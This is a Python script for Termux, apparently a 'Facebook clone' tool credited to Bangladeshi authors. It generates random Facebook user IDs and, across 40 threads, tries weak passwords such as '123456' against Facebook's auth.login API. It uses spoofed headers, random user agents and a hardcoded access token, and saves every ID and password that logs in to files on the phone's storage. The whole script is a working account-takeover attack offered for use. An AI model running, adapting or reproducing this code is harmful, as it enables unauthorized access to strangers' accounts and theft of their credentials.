"""
    @ the script orignal writen by ---( Bangladesh Hokar Potty )---
    @ Facebook : https://www.facebook.com/Normal.User.Alamgir.your.109
    @ facebook : https://www.facebook.com/Normal.User.Alamgir.your.109
    @ WhatsApp : +8801712034653
"""

import random
import requests
import sys
import time
from datetime import datetime
from datetime import date
import os
from concurrent.futures import ThreadPoolExecutor as ThreadPool

sys.stdout.write('\x1b]2; 𓆩🀪💚【CYBER᭄】㊝𓆪 🔥 \x07')

def request_storage_permission():
    try:
        open('/sdcard/@MdALAMGIR', 'w').write(' ')
    except Exception as e:
        print(e)
        print('\x1b[1;93m Allow Termux Permissions! And Run Again ')
        os.system('termux-setup-storage')

directories = [
    '/sdcard/ALAMGIR',
    '/sdcard/Md-ALAMGIR',
    '/sdcard/ALAMGIR/Md-ALAMGIR'
]
for folder_path in directories:
    try:
        os.makedirs(folder_path, exist_ok=True)
    except Exception as e:
        print(f'An error occurred while creating {folder_path}: {e}')


successfull = []
G = '\x1b[1;92m'
W = '\x1b[0;97m'
Y = '\x1b[1;93m'
B = '\x1b[1;90m'
x = f"{G}➤{W}➤"
xy1 = f"{G}•{W}•"
xy = f"{G}━{W}➤"
ALAMGIR = f"{B}[{G}━{W}]"
op1 = f"{W}|{G}1{W}|"
op2 = f"{W}|{G}2{W}|"
op0 = f"{W}|{G}0{W}|"
ch = f"{W}|{G}?{W}|"

def line():
    print(f"{W}───────────────────────────────────────────────")

_month_ = {
    '1': 'January',
    '2': 'February',
    '3': 'March',
    '4': 'April',
    '5': 'May',
    '6': 'June',
    '7': 'July',
    '8': 'August',
    '9': 'September',
    '10': 'October',
    '11': 'November',
    '12': 'December'
}

date = datetime.now().day
month = _month_[str(datetime.now().month)]
year = datetime.now().year
date_and_year = f"{date}\x1b[1;90m-\x1b[1;92m{month}\x1b[1;90m-\x1b[1;92m{year}"

def Banner():
    if 'Linux' in sys.platform.capitalize():
        os.system('clear')
    else:
        os.system('cls')
    return """
   \x1b[38;5;196m ██████ \x1b[33;1m██    ██ \x1b[38;5;46m██████  \x1b[34;1m███████ \x1b[38;5;196m██████  
   \x1b[38;5;196m██       \x1b[33;1m██  ██  \x1b[38;5;46m██   ██ \x1b[34;1m██      \x1b[38;5;196m██   ██ 
   \x1b[38;5;196m██        \x1b[33;1m████   \x1b[38;5;46m██████  \x1b[34;1m█████   \x1b[38;5;196m██████  
   \x1b[38;5;196m██         \x1b[33;1m██    \x1b[38;5;46m██   ██ \x1b[34;1m██      \x1b[38;5;196m██   ██ 
   \x1b[38;5;196m ██████    \x1b[33;1m██    \x1b[38;5;46m██████  \x1b[34;1m███████ \x1b[38;5;196m██   ██ 
   \x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
   \x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mDEVELOPER \x1b[1;91m :   \x1b[1;92mSHOHAG-KHAN
   \x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mFACEBOOK \x1b[1;91m  :   \x1b[1;92m𝐓𝐄𝐀𝐌-𝐂𝐘𝐁𝐄𝐑-𝟎𝟑
   \x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mTOOL TYPE \x1b[1;91m :   \x1b[1;92mFREE💚
   \x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mVERSION \x1b[1;91m   :   \x1b[1;92m12.3
   \x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""

def creationyear(uid):
    if len(uid) == 15:
        if uid[:10] in ('1000000000',):
            Md_dgk = '2009'
            return Md_dgk
        elif uid[:9] in ('100000000',):
            Md_dgk = '2009'
            return Md_dgk
        elif uid[:8] in ('10000000',):
            Md_dgk = '2009'
            return Md_dgk
        elif uid[:7] in ('1000000', '1000001', '1000002', '1000003', '1000004', '1000005'):
            Md_dgk = '2009'
            return Md_dgk
        elif uid[:7] in ('1000006', '1000007', '1000008', '1000009'):
            Md_dgk = '2010'
            return Md_dgk
        elif uid[:6] in ('100001',):
            Md_dgk = '2010'
            return Md_dgk
        elif uid[:6] in ('100002', '100003'):
            Md_dgk = '2011'
            return Md_dgk
        elif uid[:6] in ('100004',):
            Md_dgk = '2012'
            return Md_dgk
        elif uid[:6] in ('100005', '100006'):
            Md_dgk = '2013'
            return Md_dgk
        elif uid[:6] in ('100007', '100008'):
            Md_dgk = '2014'
            return Md_dgk
        elif uid[:6] in ('100009',):
            Md_dgk = '2015'
            return Md_dgk
        elif uid[:5] in ('10001',):
            Md_dgk = '2016'
            return Md_dgk
        elif uid[:5] in ('10002',):
            Md_dgk = '2017'
            return Md_dgk
        elif uid[:5] in ('10003',):
            Md_dgk = '2018'
            return Md_dgk
        elif uid[:5] in ('10004',):
            Md_dgk = '2019'
            return Md_dgk
        elif uid[:5] in ('10005',):
            Md_dgk = '2020'
            return Md_dgk
        elif uid[:5] in ('10006',):
            Md_dgk = '2021'
            return Md_dgk
        elif uid[:5] in ('10009',):
            Md_dgk = '2023'
            return Md_dgk
        elif uid[:5] in ('10007', '10008'):
            Md_dgk = '2022'
            return Md_dgk
        else:
            Md_dgk = ''
            return Md_dgk
    elif len(uid) in (9, 10):
        Md_dgk = '2008'
        return Md_dgk
    elif len(uid) == 8:
        Md_dgk = '2007'
        return Md_dgk
    elif len(uid) == 7:
        Md_dgk = '2006'
        return Md_dgk
    elif len(uid) == 14:
        if uid[:2] in ('61',):
            Md_dgk = '2024'
            return Md_dgk
    else:
        Md_dgk = ''
        return Md_dgk

def generate_user_agent():
    rr = random.randint
    aZ = random.choice('ABCDEFGHIJKLMNOPQRSTUVWALAMGIR')
    rx = random.randrange(1, 999)
    return f"Mozilla/5.0 (Windows NT {rr(9,11)}; Win64; x64){aZ}{rx}{aZ}) AppleWebKit/537.36 (KHTML, like Gecko){rr(99,149)}.0.{rr(4500,4999)}.{rr(35,99)} Chrome/{rr(99,175)}.0.{rr(0,5)}.{rr(0,5)} Safari/537.36"


def ua():
    rr = random.randint
    aZ = random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')
    zA = random.choice('abcdefghijklmnopqrstuvwxyz')
    rx = random.randrange(1, 999)
    xx = f"Mozilla/5.0 (Wi    ndows NT 10.0; {str(rr(9,11))}; Win64; x64){aZ}{rx}{aZ}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
    return xx

def windows():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(5,7))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(8,12))}.0.{random.choice(range(552,661))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f"5.{bx}.{bV}"
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(5,7))}.{random.choice(['2','1'])}; WOW64) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(12,42))}.0.{random.choice(range(742,2200))}.{random.choice(range(1,120))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f"5.{cx}.{cV}"
    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['2','1'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(12,42))}.0.{random.choice(range(742,2200))}.{random.choice(range(1,120))} Safari/{cz}"
    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{random.choice(range(1,7120))}.0 Safari/537.36"
    return random.choice([A, B, C, D])

def generate_user_ids(star=None, limit=None):
    if limit:
        return [str(random.randint(111111111, 999999999)) for _ in range(limit)]
    return [str(random.randint(111111111, 999999999)) for _ in range(1000)]

def login(uid):
    session = requests.Session()
    for pw in ('123456', '12345678', '123123', '0987654321', '123123', '654321', '87654321', '7654321', '000000', '111111', '143143', '111222', '112233'):
        try:
            rr = str(random.randint(20000000, 30000000))
            aZ = str(random.randint(20000, 40000))
            headers = {
                'x-fb-connection-bandwidth': rr,
                'x-fb-sim-hni': aZ,
                'x-fb-net-hni': aZ,
                'x-fb-connection-quality': 'EXCELLENT',
                'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                'user-agent': generate_user_agent(),
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-http-engine': 'Liger'
            }
            response = session.get(
                'https://b-api.facebook.com/method/auth.login',
                params={
                    'format': 'json',
                    'email': uid,
                    'password': pw,
                    'credentials_type': 'device_based_login_password',
                    'generate_session_cookies': '1',
                    'error_detail_type': 'button_with_disabled',
                    'source': 'device_based_login',
                    'meta_inf_fbmeta': '%20¤tly_logged_in_userid=0',
                    'method': 'GET',
                    'locale': 'en_US',
                    'client_country_code': 'US',
                    'fb_api_caller_class': 'com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler',
                    'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'fb_api_req_friendly_name': 'authenticate',
                    'cpl': 'true'
                },
                headers=headers
            ).json()
            
            if 'session_key' in response or 'EAAA' in str(response):
                with open('/sdcard/SK_old.txt', 'a') as file:
                    file.write(f'[CYBER-OK💚] {uid}|{pw}|{creationyear(uid)}\n')
                line()
                print(f"\r{xy1}{G} [CYBER-OK💚] {uid} | {pw} | {creationyear(uid)}")
                ProfileLink = f'https://www.facebook.com/profile.php?id={uid}'
                print(f"\r{x}{G} PROFILE LINK {G}➤ {ProfileLink}")
                line()
                with open('/sdcard/ALAMGIR/OLD-UID/ALAMGIR_old_uid_ok.txt', 'a') as f:
                    f.write(f'[Md-OK] {uid} | {pw} | {creationyear(uid)}\n')
                successfull.append(f"{uid}|{pw}")
                return
            elif 'Please Confirm Email' in str(response):
                with open('/sdcard/SK_old.txt', 'a') as file:
                    file.write(f'[CYBER-OK💚] {uid}|{pw}|{creationyear(uid)}\n')
                line()
                print(f"\r{xy1}{G} [CYBER-OK💚] {uid} | {pw} | {creationyear(uid)}")
                ProfileLink = f'https://www.facebook.com/profile.php?id={uid}'
                print(f"\r{x}{G} PROFILE LINK {G}➤ {ProfileLink}")
                line()
                successfull.append(f"{uid}|{pw}")
                return
        except Exception as e:
            time.sleep(5)
        sys.stdout.write(f"\r\x1b[0;97m[\x1b[1;92m{date_and_year}\x1b[0;97m] \x1b[38;5;208m{uid}{W}|{G}{len(successfull)}{W} ")

def main():
    print(Banner())
    print(f"{op1} Update-Coming")
    print(f"{op2} CLONE 2009-2010")
    print(f"{op0} {G}CONTACT DEVELOPER")
    line()
    choice = input(f"{ch} Select : ")
    print(Banner())
    MdALAMGIR = '10000' if choice in ('1', '01') else '100000'
    if MdALAMGIR == '100000':
        print(f"{x} EXAMPLE {G}:{W} 1000 {G}|{W} 2000 {G}|{W} 5000 {G}|{W} 10000")
        line()
        limit = int(input(f"{ch} LIMIT {G}:{W} "))
        user_ids = generate_user_ids(MdALAMGIR, limit)
    else:
        user_ids = generate_user_ids(MdALAMGIR)
    print(Banner())
    print(f"{x} OK/CP IDS WILL BE SAVED IN {xy} /SDCARD")
    line()
    print(f"{x} TOTAL UID {xy} {len(user_ids)}")
    line()
    with ThreadPool(max_workers=40) as pool:
        pool.map(login, user_ids)
    print()
    line()
    print(f"{x} PROGRAM FINISHED.")
    print(f"{x} TOTAL OK: {str(len(successfull))}/{str(len(successfull))}")
    line()
    input(' [ Press enter to back ]')
    main()

if __name__ == '__main__':
    main()